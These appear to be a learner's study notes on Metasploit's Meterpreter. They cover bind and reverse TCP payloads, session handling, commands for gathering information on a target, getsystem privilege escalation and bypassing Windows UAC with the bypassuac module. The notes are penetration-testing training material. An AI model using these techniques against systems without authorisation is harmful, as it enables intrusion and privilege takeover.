METERPRETER


	- Can both wait for a connection on the target machine or connect back to the attacker machine

	- Most used: 

		+ bind_tcp = runs on a server process on the target machine that waits for connections from the attacker machine 

		+ reverse_tcp = performs a TCP connection back to the attacker machine. Can help evade firewall rules 

	+ Choosing between the linux and windwos meterpreter 



MANAGING METERPRETER SESSIONS

	+ meterpreter > background = switch from meterpreter session to the console 
	+ sessions -l = list currenlty opened sessions 

	+ sessions -i = resume a background session 


METERPRETER INFO GATHERING 

	+ sysinfo = retreive information about the exploited machine: name, OS, architecture, system language and meterpreter version

	+ ifconfig = prints the network configuration 

	+ getuid = which user is running the process 



PRIVILEGE ESCALATION


	+ getsystem = runs privileges escalation routing on the target machine 



BYPASSING UAC 

	+ Modern day OS's the "User Account Control" policy prevents priv esc

	+ Bypass the restrictions by using the bypassuac module 

		+ exploit/windows/local/bypassuac 

		+ takes one argument the meterpreter session where you want to bypass UAC 

	+ new meterpreter session will have UAC disabled
